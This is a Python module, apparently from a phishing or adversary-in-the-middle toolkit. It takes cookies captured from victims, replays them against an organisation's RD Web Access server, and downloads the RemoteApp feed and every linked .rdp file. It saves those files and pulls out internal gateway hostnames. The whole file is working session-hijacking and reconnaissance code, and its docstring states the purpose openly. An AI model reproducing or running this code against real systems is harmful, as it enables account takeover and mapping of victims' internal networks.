"""Replay captured cookies upstream to harvest the RemoteApp feed and .rdp files.

The victim's .rdp targets enumerate the internal network — gateway hostnames,
collection names, internal server FQDNs.
"""
import re
from urllib.parse import urljoin

import aiohttp

RDP_LINK_RE = re.compile(r"(/RDWeb/Pages/rdp/[^\s\"'<>&]+\.rdp)", re.IGNORECASE)


def log(*a):
    print("[harvest]", *a, flush=True)


async def harvest_session(cfg, sess):
    if not sess.data["cookies"]:
        log("sid=%s: no cookies to replay" % sess.sid)
        return False
    cookie_hdr = sess.cookie_header()
    base = cfg.upstream_origin
    timeout = aiohttp.ClientTimeout(total=90, connect=15)
    saved_rdps = []
    conn = aiohttp.TCPConnector(ssl=False)
    async with aiohttp.ClientSession(cookie_jar=aiohttp.DummyCookieJar(),
                                     timeout=timeout, connector=conn) as c:
        async with c.get(base + "/RDWeb/Pages/en-US/Default.aspx",
                         headers={"Cookie": cookie_hdr},
                         allow_redirects=False) as r:
            if r.status in (301, 302):
                loc = r.headers.get("Location", "")
                if not loc.startswith("http"):
                    loc = base + loc
                async with c.get(loc, headers={"Cookie": cookie_hdr},
                                 allow_redirects=False) as r2:
                    r = r2
            body = await r.text(errors="replace")
            if r.status != 200 or "login.aspx" in r.url.path.lower():
                log("sid=%s: feed fetch failed (HTTP %d)" % (sess.sid, r.status))
                sess.event("harvest_failed", status=r.status)
                return False
            sess.save_artifact("feed.xml", body)
            sess.data["harvest"]["feed_saved"] = True
            log("sid=%s: feed saved (%d bytes)" % (sess.sid, len(body)))

        links = []
        seen = set()
        for m in RDP_LINK_RE.finditer(body):
            u = urljoin(base + "/", m.group(1))
            if u not in seen:
                seen.add(u)
                links.append(u)
        for u in links:
            try:
                async with c.get(u, headers={"Cookie": cookie_hdr},
                                 allow_redirects=False) as rr:
                    if rr.status != 200:
                        continue
                    txt = await rr.text(errors="replace")
            except aiohttp.ClientError as e:
                log("rdp fetch error:", repr(e))
                continue
            name = u.rstrip("/").rsplit("/", 1)[-1]
            sess.save_artifact(name, txt)
            saved_rdps.append(name)
            gw = None
            m = re.search(r"^gatewayhostname\s*:\s*s:(.+)$", txt, re.MULTILINE)
            if m:
                gw = m.group(1).strip()
            log("sid=%s: saved %s (gw=%s)" % (sess.sid, name, gw))

    sess.data["harvest"]["rdp_files"] = saved_rdps
    sess.data["auth_state"] = "harvested"
    sess.event("harvested", rdp_files=saved_rdps)
    return True
